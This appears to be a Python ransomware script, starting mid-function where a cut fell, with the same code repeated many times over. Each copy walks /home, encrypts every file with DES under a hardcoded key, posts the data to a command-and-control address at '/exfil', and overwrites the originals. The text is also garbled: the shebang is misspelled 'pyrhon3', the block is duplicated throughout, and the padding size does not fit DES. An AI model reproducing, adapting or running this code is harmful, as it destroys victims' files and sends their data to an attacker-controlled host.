    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
